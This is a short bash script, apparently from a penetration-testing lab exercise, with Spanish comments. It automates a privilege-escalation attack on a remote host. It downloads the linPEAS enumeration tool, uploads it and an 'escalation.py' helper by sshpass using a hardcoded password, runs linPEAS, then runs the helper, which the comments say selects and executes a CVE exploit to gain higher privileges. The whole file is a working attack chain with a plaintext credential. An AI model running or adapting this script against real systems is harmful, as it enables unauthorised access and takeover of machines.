#! /bin/bash

REMOTE_USER="webadmin"
REMOTE_HOST="192.168.100.55"
REMOTE_PATH="/home/webadmin"
PASS="toronto"

#Descargar linpeas
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh 
chmod +x ./linpeas.sh

#Ahora se copia el archivo a webadmin
sshpass -p $PASS scp -P 2245 linpeas.sh $REMOTE_USER@$REMOTE_HOST:$REMOTE_PATH


#En este archivo analizo la entrada de linpeas con el objetivo de conocer la vulnerabilidad que se va a explotar
sshpass -p $PASS scp -P 2245 escalation.py $REMOTE_USER@$REMOTE_HOST:$REMOTE_PATH

#La siguiente linea copia todos los resultados de linpeas en el archivo txt en el webadmin mediante una conexion SSH
#Es importante notar que la segunda P es minuscula
sshpass -p $PASS ssh -p 2245 $REMOTE_USER@$REMOTE_HOST "./linpeas.sh -a > 317274282_linpeas.txt"

#Esta linea copia el archivo.py en webadmin para que se ejecute. Este es el que 
# - Guarda los CVE en un archivo
# - Analiza los CVE y ejecuta el que deseamos
# - Ejecuta el CVE para escalar en los permisos
sshpass -p $PASS ssh -p 2245 $REMOTE_USER@$REMOTE_HOST "python3 escalation.py"
 
